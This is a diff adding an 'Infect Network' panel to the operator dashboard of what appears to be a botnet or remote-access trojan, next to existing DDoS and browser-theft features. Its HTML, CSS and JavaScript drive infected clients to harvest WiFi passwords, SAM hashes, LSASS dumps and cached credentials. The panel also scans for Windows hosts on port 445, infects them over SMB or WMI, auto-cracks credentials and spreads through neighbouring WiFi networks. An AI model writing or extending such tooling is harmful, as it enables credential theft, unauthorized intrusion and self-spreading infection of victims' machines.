@@ -164,6 +164,31 @@
         #ddos-log .log-entry.warn { color: var(--accent-orange); }
         #ddos-log .log-entry.success { color: var(--accent-green); }
 
+        /* ── Infect Network ── */
+        #infect-panel .credential-card { background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 12px 16px; margin-bottom: 8px; }
+        #infect-panel .credential-card .cred-password { color: var(--accent-green); font-family: var(--font-mono); font-size: 13px; word-break: break-all; }
+        #infect-panel .target-row { display: flex; align-items: center; padding: 8px 12px; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-sm); margin-bottom: 6px; gap: 10px; transition: var(--transition); }
+        #infect-panel .target-row:hover { border-color: var(--accent-purple); }
+        #infect-panel .target-row .target-ip { font-family: var(--font-mono); color: var(--text-primary); min-width: 110px; }
+        #infect-panel .target-row .target-host { color: var(--text-secondary); font-size: 12px; flex: 1; }
+        #infect-panel .target-row .target-status { font-size: 11px; padding: 2px 8px; border-radius: 10px; font-weight: 600; }
+        #infect-panel .target-row .target-status.smb { background: rgba(46,160,67,0.2); color: var(--accent-green); }
+        #infect-panel .target-row .target-status.wmi { background: rgba(121,192,255,0.2); color: var(--accent-blue); }
+        #infect-panel .target-row .target-status.none { background: rgba(248,81,73,0.2); color: var(--accent-red); }
+        #infect-panel .btn-infect { background: var(--accent-purple); color: #fff; border: none; padding: 5px 14px; border-radius: var(--radius-sm); font-size: 12px; font-weight: 600; cursor: pointer; transition: var(--transition); white-space: nowrap; }
+        #infect-panel .btn-infect:hover { filter: brightness(1.2); transform: scale(1.03); }
+        #infect-panel .btn-infect:disabled { opacity: 0.4; cursor: not-allowed; transform: none; filter: none; }
+        #infect-panel .btn-scan { background: var(--accent-blue); color: #fff; border: none; padding: 8px 20px; border-radius: var(--radius-sm); font-size: 13px; font-weight: 600; cursor: pointer; transition: var(--transition); }
+        #infect-panel .btn-scan:hover { filter: brightness(1.2); }
+        #infect-panel .btn-scan:disabled { opacity: 0.4; cursor: not-allowed; }
+        #infect-panel .btn-harvest { background: var(--accent-orange); color: #fff; border: none; padding: 8px 16px; border-radius: var(--radius-sm); font-size: 12px; font-weight: 600; cursor: pointer; transition: var(--transition); }
+        #infect-panel .btn-harvest:hover { filter: brightness(1.2); }
+        #infect-log { max-height: 200px; overflow-y: auto; font-size: 11px; font-family: var(--font-mono); }
+        #infect-log .log-entry { padding: 3px 8px; border-bottom: 1px solid rgba(48,54,61,0.3); }
+        #infect-log .log-entry.success { color: var(--accent-green); }
+        #infect-log .log-entry.error { color: var(--accent-red); }
+        #infect-log .log-entry.info { color: var(--accent-blue); }
+        #infect-log .log-entry.warn { color: var(--accent-orange); }
         /* Toast */
         #toast-container { position: fixed; top: 56px; right: 16px; z-index: 9999; display: flex; flex-direction: column; gap: 8px; pointer-events: none; }
         .toast { background: var(--bg-elevated); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 12px 16px; font-size: 13px; box-shadow: var(--shadow-lg); animation: slideIn 0.3s ease; pointer-events: auto; max-width: 360px; }
@@ -246,6 +271,9 @@
         </div>
         <div class="nav-item" data-panel="ddos-panel" onclick="switchPanel('ddos-panel', this)">
             <span class="nav-icon">🧨</span><span class="nav-label">DDoS Attack</span>
+        </div>
+        <div class="nav-item" data-panel="infect-panel" onclick="switchPanel('infect-panel', this)">
+            <span class="nav-icon">🧬</span><span class="nav-label">Infect Network</span>
         </div>
         <div class="sidebar-section-title">Dashboard</div>
         <div class="nav-item" data-panel="stats-panel" onclick="switchPanel('stats-panel', this)">
@@ -556,6 +584,80 @@
         </div>
     </div>
 
+    <!-- INFECT NETWORK -->
+    <div id="infect-panel" class="panel">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;">
+            <span class="nav-icon" style="font-size:22px;">🧬</span>
+            <h2 style="margin:0;font-size:18px;color:var(--text-primary);">Network Infection</h2>
+            <span style="font-size:11px;color:var(--accent-purple);background:rgba(188,140,255,0.15);padding:2px 8px;border-radius:10px;">Botnet</span>
+        </div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;">
+            <!-- LEFT COLUMN: Credential Harvester -->
+            <div>
+                <div class="stat-card" style="margin-bottom:12px;">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                        <h3 style="margin:0;font-size:14px;color:var(--text-primary);">🔑 Credential Harvester</h3>
+                        <button class="btn-harvest" id="harvest-btn" onclick="toggleHarvest()">🕵️ Harvest Credentials</button>
+                    </div>
+                    <div id="credential-results" style="max-height:350px;overflow-y:auto;">
+                        <div style="text-align:center;padding:20px;color:var(--text-muted);font-size:13px;">
+                            Click "Harvest Credentials" to extract WiFi passwords, SAM hashes, LSASS dump & cached credentials
+                        </div>
+                    </div>
+                </div>
+
+                <div class="stat-card">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                        <h3 style="margin:0;font-size:14px;color:var(--text-primary);">🎯 Manual Infection</h3>
+                    </div>
+                    <div style="display:flex;flex-direction:column;gap:8px;">
+                        <input id="infect-target" placeholder="Target IP (e.g. 192.168.1.105)" style="width:100%;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
+                        <div style="display:flex;gap:8px;">
+                            <input id="infect-username" placeholder="Username" value="Administrator" style="flex:1;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
+                            <input id="infect-password" type="password" placeholder="Password" style="flex:1;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;font-family:var(--font-mono);outline:none;">
+                        </div>
+                        <div style="display:flex;gap:8px;">
+                            <select id="infect-method" style="flex:1;padding:8px 12px;background:var(--bg-tertiary);border:1px solid var(--border-color);border-radius:var(--radius-sm);color:var(--text-primary);font-size:13px;outline:none;">
+                                <option value="auto">Auto-Detect</option>
+                                <option value="smb">SMB (Admin Share)</option>
+                                <option value="wmi">WMI</option>
+                            </select>
+                            <button class="btn-infect" id="infect-btn" onclick="infectTarget()" style="padding:8px 20px;font-size:13px;">💉 Infect</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- RIGHT COLUMN: Network Scan + Log -->
+            <div>
+                <div class="stat-card" style="margin-bottom:12px;">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                        <h3 style="margin:0;font-size:14px;color:var(--text-primary);">🌐 Network Scan</h3>
+                        <div style="display:flex;gap:6px;">
+                            <button class="btn-scan" id="scan-btn" onclick="toggleScan()">🔍 Scan Network</button>
+                            <button class="btn-harvest" id="auto-btn" onclick="toggleAutoInfect()" style="background:var(--accent-purple);">🚀 Auto-Infect All</button>
+                        </div>
+                    </div>
+                    <div id="scan-results" style="max-height:280px;overflow-y:auto;">
+                        <div style="text-align:center;padding:20px;color:var(--text-muted);font-size:13px;">
+                            Click "Scan Network" to discover Windows machines (port 445 SMB)
+                        </div>
+                    </div>
+                </div>
+
+                <div class="stat-card">
+                    <h3 style="margin:0 0 10px 0;font-size:14px;color:var(--text-primary);">📋 Infection Log</h3>
+                    <div id="infect-log">
+                        <div id="infect-log-placeholder" style="text-align:center;padding:15px;color:var(--text-muted);font-size:12px;">
+                            Scan network & infect targets to see results here
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
 </div>
 
 <div id="toast-container"></div>
@@ -841,6 +943,88 @@
             }
             d.innerHTML = html || 'No browsers found';
             showToast('Browser steal complete', 'success');
+        });
+
+        // ─── Network Infection ───
+        APP.infectActive = false;
+        APP.socket.on('credential_harvest_result', data => {
+            const div = document.getElementById('credential-results');
+            let html = '';
+            if (data.wifi && data.wifi.profiles) {
+                html += '<div class="credential-card"><strong>📶 WiFi Passwords</strong> (' + (data.wifi.count||0) + ' networks)</div>';
+                for (const p of (data.wifi.profiles||[])) {
+                    const hasPwd = p.password && p.password !== '[OPEN/NONE]';
+                    const safeSsid = (p.ssid||'').replace(/'/g, "\\'").replace(/\\/g, "\\\\");
+                    const safePwd = (p.password||'').replace(/'/g, "\\'").replace(/\\/g, "\\\\");
+                    html += '<div class="credential-card" style="font-size:12px;display:flex;justify-content:space-between;align-items:center;"><div>📡 <strong>' + escHtml(p.ssid) + '</strong><br><span class="cred-password">🔑 ' + escHtml(p.password) + '</span></div>' +
+                        (hasPwd ? '<button class="btn-infect" onclick="wifiNeighborInfect(\'' + safeSsid + '\', \'' + safePwd + '\')" style="font-size:10px;padding:3px 8px;">📶 Infect</button>' : '<span style="font-size:10px;color:var(--text-muted);">open network</span>') +
+                        '</div>';
+                }
+            }
+            if (data.sam && data.sam.hashes) {
+                html += '<div class="credential-card"><strong>💾 SAM Hashes</strong> (' + data.sam.hashes.length + ' users)</div>';
+                for (const h of (data.sam.hashes||[]).slice(0, 10)) {
+                    html += '<div class="credential-card" style="font-size:11px;">👤 ' + escHtml(h.username) + '<br><span style="color:var(--accent-orange);font-size:10px;">' + escHtml(h.hash||'') + '</span></div>';
+                }
+            }
+            if (data.lsass && data.lsass.success) {
+                html += '<div class="credential-card"><strong>🧠 LSASS Dump</strong><br><span style="color:var(--accent-green);font-size:12px;">✅ ' + data.lsass.dump_size_mb + ' MB dumped from PID ' + data.lsass.lsass_pid + '</span></div>';
+            } else if (data.lsass && data.lsass.error) {
+                html += '<div class="credential-card"><strong>🧠 LSASS Dump</strong><br><span style="color:var(--accent-red);font-size:12px;">❌ ' + escHtml(data.lsass.error) + '</span></div>';
+            }
+            if (data.cached) {
+                const cmdkey = (data.cached.cmdkey||[]).length;
+                const rdp = (data.cached.rdp||[]).length;
+                if (cmdkey > 0 || rdp > 0) {
+                    html += '<div class="credential-card"><strong>💼 Cached Credentials</strong><br><span style="font-size:12px;">cmdkey: ' + cmdkey + ' | RDP saved: ' + rdp + '</span></div>';
+                }
+            }
+            div.innerHTML = html || '<div style="text-align:center;padding:20px;color:var(--text-muted);">No credentials found</div>';
+            infectLog('Credential harvest complete: ' + ((data.wifi||{}).count||0) + ' WiFi, ' + ((data.sam||{}).hashes||[]).length + ' SAM users', 'success');
+        });
+
+        APP.socket.on('infect_scan_result', data => {
+            const div = document.getElementById('scan-results');
+            let html = '<div style="font-size:12px;color:var(--text-muted);margin-bottom:8px;">Scanned: ' + (data.scanned||0) + ' IPs | Windows hosts: ' + (data.windows_hosts||[]).length + ' | Infectable: ' + (data.infectable||[]).length + '</div>';
+            for (const h of (data.infectable||[])) {
+                const statusClass = h.smb_accessible ? 'smb' : (h.wmi_accessible ? 'wmi' : 'none');
+                const statusText = h.smb_accessible ? 'SMB' : (h.wmi_accessible ? 'WMI' : 'LOCKED');
+                html += '<div class="target-row"><span class="target-ip">🖥️ ' + escHtml(h.ip) + '</span><span class="target-host">' + escHtml(h.hostname||'') + '</span><span class="target-status ' + statusClass + '">' + statusText + '</span><button class="btn-infect" onclick="quickInfect(\'' + escHtml(h.ip) + '\')">💉</button></div>';
+            }
+            for (const h of (data.windows_hosts||[])) {
+                if ((data.infectable||[]).find(x => x.ip === h.ip)) continue;
+                html += '<div class="target-row"><span class="target-ip">🖥️ ' + escHtml(h.ip) + '</span><span class="target-host">' + escHtml(h.hostname||'') + '</span><span class="target-status none">LOCKED</span><button class="btn-infect" onclick="quickInfect(\'' + escHtml(h.ip) + '\')">💉</button></div>';
+            }
+            div.innerHTML = html || '<div style="text-align:center;padding:20px;color:var(--text-muted);">No Windows machines found on network</div>';
+            infectLog('Scan complete: ' + (data.infectable||[]).length + ' infectable hosts found', 'info');
+        });
+
+        APP.socket.on('infect_result', data => {
+            const icon = data.success ? '✅' : '❌';
+            infectLog(icon + ' ' + escHtml(data.target) + ' [' + (data.method_used||'?') + ']: ' + escHtml(data.message||''), data.success ? 'success' : 'error');
+        });
+
+        APP.socket.on('infect_credential_result', data => {
+            infectLog((data.success ? '✅' : '❌') + ' Cred test ' + escHtml(data.target) + '\\' + escHtml(data.username) + ': ' + (data.success ? 'OK' : 'FAIL'), data.success ? 'success' : 'error');
+        });
+
+        APP.socket.on('wifi_infect_result', data => {
+            if (data.error) { infectLog('❌ WiFi infect error: ' + escHtml(data.error), 'error'); return; }
+            infectLog('📶 WiFi ' + escHtml(data.ssid||'') + ': ' + (data.connected ? '✅ Connected' : '❌ Connection failed'), data.connected ? 'success' : 'error');
+            if (data.connected) {
+                infectLog('🌐 Scanned ' + (data.scanned||0) + ' IPs | Infected ' + (data.infected||[]).length + ' machines', 'success');
+                showToast('WiFi neighbor infection: ' + (data.infected||[]).length + ' machines infected', 'success');
+            }
+        });
+
+        APP.socket.on('infect_auto_result', data => {
+            const count = (data.successful||[]).length;
+            infectLog('🚀 Auto-try complete: ' + count + '/' + (data.targets_scanned||0) + ' targets cracked | ' + (data.credentials_tried||0) + ' creds tried', count > 0 ? 'success' : 'warn');
+            showToast('Auto-infect: ' + count + ' credentials cracked', count > 0 ? 'success' : 'warn');
+        });
+
+        APP.socket.on('infect_status', data => {
+            infectLog('⏳ Phase: ' + escHtml(data.phase||'') + ' | Targets: ' + (data.total||0) + ' | Creds: ' + (data.creds||0), 'info');
         });
 
         // DDoS
@@ -1278,6 +1462,80 @@
         const secs = elapsed % 60;
         document.getElementById('ddos-duration').textContent =
             String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+    }
+
+    // ─── Network Infection ──────────────────────────────────────────
+    function infectLog(msg, type) {
+        const log = document.getElementById('infect-log');
+        const placeholder = document.getElementById('infect-log-placeholder');
+        if (placeholder) placeholder.remove();
+        const entry = document.createElement('div');
+        entry.className = 'log-entry ' + (type || 'info');
+        const ts = new Date().toLocaleTimeString();
+        entry.textContent = '[' + ts + '] ' + msg;
+        log.appendChild(entry);
+        log.scrollTop = log.scrollHeight;
+    }
+
+    function toggleHarvest() {
+        const btn = document.getElementById('harvest-btn');
+        btn.disabled = true;
+        btn.textContent = '⏳ Harvesting...';
+        document.getElementById('credential-results').innerHTML = '<div style="text-align:center;padding:20px;color:var(--accent-orange);">⏳ Harvesting credentials (WiFi, SAM, LSASS, cached)...</div>';
+        emitToClient('credential_harvest', {});
+        setTimeout(() => { btn.disabled = false; btn.textContent = '🕵️ Harvest Credentials'; }, 5000);
+        infectLog('Credential harvest started', 'info');
+    }
+
+    function toggleScan() {
+        const btn = document.getElementById('scan-btn');
+        btn.disabled = true;
+        btn.textContent = '⏳ Scanning...';
+        document.getElementById('scan-results').innerHTML = '<div style="text-align:center;padding:20px;color:var(--accent-blue);">⏳ Scanning network for Windows machines (port 445)...</div>';
+        emitToClient('infect_scan', {});
+        setTimeout(() => { btn.disabled = false; btn.textContent = '🔍 Scan Network'; }, 10000);
+        infectLog('Network scan started', 'info');
+    }
+
+    function infectTarget() {
+        const target = document.getElementById('infect-target').value.trim();
+        const username = document.getElementById('infect-username').value.trim();
+        const password = document.getElementById('infect-password').value;
+        const method = document.getElementById('infect-method').value;
+        if (!target) { showToast('Enter target IP', 'error'); return; }
+        if (!username) { showToast('Enter username', 'error'); return; }
+        const btn = document.getElementById('infect-btn');
+        btn.disabled = true;
+        btn.textContent = '⏳ Infecting...';
+        emitToClient('infect_start', { target: target, username: username, password: password, method: method });
+        setTimeout(() => { btn.disabled = false; btn.textContent = '💉 Infect'; }, 15000);
+        infectLog('Infection attempt: ' + target + ' as ' + username + ' [' + method + ']', 'warn');
+    }
+
+    function quickInfect(ip) {
+        document.getElementById('infect-target').value = ip;
+        const username = document.getElementById('infect-username').value.trim();
+        const password = document.getElementById('infect-password').value;
+        if (!username || !password) {
+            showToast('Set username & password first', 'warn');
+            return;
+        }
+        infectTarget();
+    }
+
+    function toggleAutoInfect() {
+        const btn = document.getElementById('auto-btn');
+        btn.disabled = true;
+        btn.textContent = '⏳ Auto-Infecting...';
+        emitToClient('infect_auto_try', {});
+        setTimeout(() => { btn.disabled = false; btn.textContent = '🚀 Auto-Infect All'; }, 120000);
+        infectLog('🚀 Auto-infect started: scanning + harvesting + cracking + infecting', 'warn');
+    }
+
+    function wifiNeighborInfect(ssid, password) {
+        infectLog('📶 Attempting neighbor infection via WiFi: ' + escHtml(ssid), 'warn');
+        emitToClient('wifi_infect', { ssid: ssid, password: password });
+        showToast('WiFi neighbor infection started: ' + ssid, 'warn');
     }
 
     // ─── Network Topology Map (D3.js) ─────────────────────────────────
